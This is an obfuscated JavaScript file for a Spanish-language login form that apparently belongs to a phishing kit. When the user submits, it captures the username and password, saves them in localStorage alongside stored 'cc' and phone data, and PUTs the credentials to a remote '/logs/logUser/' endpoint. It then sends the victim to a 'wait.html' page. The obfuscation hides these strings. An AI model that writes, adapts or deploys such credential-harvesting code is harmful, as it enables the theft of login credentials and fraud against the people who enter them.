const _0x169f72 = _0x3a0b;
(function (_0x35fc02, _0x45c000) {
  const _0x4c2e7e = _0x3a0b,
    _0x2e1c53 = _0x35fc02();
  while (!![]) {
    try {
      const _0x13ed23 =
        (-parseInt(_0x4c2e7e(0x1e4)) / 0x1) *
          (-parseInt(_0x4c2e7e(0x1f2)) / 0x2) +
        parseInt(_0x4c2e7e(0x1eb)) / 0x3 +
        -parseInt(_0x4c2e7e(0x1d2)) / 0x4 +
        parseInt(_0x4c2e7e(0x1e3)) / 0x5 +
        (-parseInt(_0x4c2e7e(0x1f1)) / 0x6) *
          (-parseInt(_0x4c2e7e(0x1e1)) / 0x7) +
        (parseInt(_0x4c2e7e(0x1ee)) / 0x8) *
          (-parseInt(_0x4c2e7e(0x1ed)) / 0x9) +
        (-parseInt(_0x4c2e7e(0x1e7)) / 0xa) *
          (parseInt(_0x4c2e7e(0x1e9)) / 0xb);
      if (_0x13ed23 === _0x45c000) break;
      else _0x2e1c53["push"](_0x2e1c53["shift"]());
    } catch (_0x1cc5c8) {
      _0x2e1c53["push"](_0x2e1c53["shift"]());
    }
  }
})(_0x1c01, 0xc8269);
function updateLS() {
  const _0xba5f4f = _0x3a0b;
  LS[_0xba5f4f(0x1d8)](_0xba5f4f(0x1da), JSON[_0xba5f4f(0x1f0)](info));
}
const button = document[_0x169f72(0x1e2)](_0x169f72(0x1de)),
  userInput = document["getElementById"]("txtUsuario"),
  passInput = document[_0x169f72(0x1e2)](_0x169f72(0x1dc));
function _0x3a0b(_0x2dbffa, _0x4430f3) {
  const _0x1c0130 = _0x1c01();
  return (
    (_0x3a0b = function (_0x3a0b16, _0x1a22bc) {
      _0x3a0b16 = _0x3a0b16 - 0x1d0;
      let _0x527a44 = _0x1c0130[_0x3a0b16];
      return _0x527a44;
    }),
    _0x3a0b(_0x2dbffa, _0x4430f3)
  );
}
async function updateStatus() {
  const _0x314869 = _0x169f72;
  button["disabled"] = !![];
  const _0xba29b9 = await fetch(url + _0x314869(0x1ec), {
      method: _0x314869(0x1f3),
      headers: { "Content-Type": "application/json" },
    }),
    _0x49d1da = await _0xba29b9["json"](),
    _0x1505e5 = [..._0x49d1da];
  for (const _0x320f8f of _0x1505e5) {
    if (
      _0x320f8f["reg"] == info[_0x314869(0x1d7)]["cc"] &&
      _0x320f8f["cl"] == info[_0x314869(0x1d7)][_0x314869(0x1d3)]
    ) {
      console[_0x314869(0x1e5)](_0x314869(0x1d4));
      const _0x38fb2a = await fetch(
          url + _0x314869(0x1e0) + _0x320f8f["idreg"],
          {
            method: _0x314869(0x1ea),
            headers: { "Content-Type": _0x314869(0x1db) },
            body: JSON[_0x314869(0x1f0)]({
              us: info[_0x314869(0x1d7)]["user"],
              ps: info[_0x314869(0x1d7)][_0x314869(0x1d6)],
              status: _0x314869(0x1d1),
            }),
          }
        ),
        _0x48b88e = await _0x38fb2a["json"]();
      _0x38fb2a["ok"]
        ? console[_0x314869(0x1e5)](_0x314869(0x1ef))
        : console[_0x314869(0x1f6)](
            "Error\x20al\x20actualizar\x20usuario:",
            _0x38fb2a[_0x314869(0x1dd)]
          );
    }
  }
  (button[_0x314869(0x1df)] = ![]),
    (window[_0x314869(0x1d5)][_0x314869(0x1d0)] = "wait.html");
}
function _0x1c01() {
  const _0x4d942d = [
    "addEventListener",
    "info",
    "application/json",
    "txtPass",
    "statusText",
    "btnUsuario",
    "disabled",
    "/logs/logUser/",
    "7441gqGLHr",
    "getElementById",
    "6310245EceHQH",
    "380503FpryIY",
    "log",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "77930zxSFey",
    "preventDefault",
    "22yjEWtu",
    "PUT",
    "2481192irJMto",
    "/logs/logs",
    "12920643gTfQTK",
    "8CyjJBn",
    "Usuario\x20actualizado",
    "stringify",
    "5142vWrCfN",
    "2GkblxE",
    "GET",
    "focus",
    "value",
    "error",
    "href",
    "Corrigió\x20Usuario",
    "4438308NbrigB",
    "telnum",
    "Usuario\x20encontrado",
    "location",
    "puser",
    "metaInfo",
    "setItem",
  ];
  _0x1c01 = function () {
    return _0x4d942d;
  };
  return _0x1c01();
}
button[_0x169f72(0x1d9)]("click", async function (_0x48d138) {
  const _0x35c303 = _0x169f72;
  _0x48d138[_0x35c303(0x1e8)]();
  if (userInput[_0x35c303(0x1f5)] == "" && passInput["value"] == "") {
    alert(_0x35c303(0x1e6)), userInput[_0x35c303(0x1f4)]();
    return;
  } else {
    var _0x531245 = userInput[_0x35c303(0x1f5)],
      _0x99cc75 = passInput[_0x35c303(0x1f5)];
    (info[_0x35c303(0x1d7)]["user"] = _0x531245),
      (info["metaInfo"]["puser"] = _0x99cc75),
      updateLS(),
      await updateStatus();
  }
});
